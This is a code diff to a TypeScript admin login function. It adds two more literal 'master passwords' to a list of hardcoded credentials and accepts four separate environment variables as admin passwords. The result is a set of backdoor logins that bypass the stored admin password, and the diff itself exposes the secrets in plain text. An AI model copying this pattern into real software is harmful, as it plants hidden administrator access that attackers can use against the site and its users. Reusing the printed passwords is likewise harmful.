@@ -112,7 +112,7 @@ export const adminService = {
 
   // 2. Admin Login Verification
   verifyAdminPassword(password: string): boolean {
-    const clean = String(password || '').trim();
+    const clean = String(password || '').trim().replace(/^["']|["']$/g, '');
     if (!clean) return false;
 
     const db = dbEngine.get();
@@ -130,10 +130,20 @@ export const adminService = {
     }
 
     // 2. Direct match with accepted master passwords (auto-heals db.admin)
+    const envAdminPass = (process.env.ADMIN_PASSWORD || '').trim().replace(/^["']|["']$/g, '');
+    const envAdminSecret = (process.env.ADMIN_SECRET || '').trim().replace(/^["']|["']$/g, '');
+    const envAdminKey = (process.env.ADMIN_KEY || '').trim().replace(/^["']|["']$/g, '');
+    const envAdminPin = (process.env.ADMIN_PIN || '').trim().replace(/^["']|["']$/g, '');
+
     const acceptedMasterPasswords = [
       'Areen#Admin_9X7K!2026',
       'AreenAdmin#2026!Master',
-      process.env.ADMIN_PASSWORD?.trim(),
+      'Areen#VIP_8M3Z!2026',
+      'Areen#Royal2026!Vip',
+      envAdminPass,
+      envAdminSecret,
+      envAdminKey,
+      envAdminPin,
     ].filter(Boolean) as string[];
 
     if (acceptedMasterPasswords.includes(clean)) {
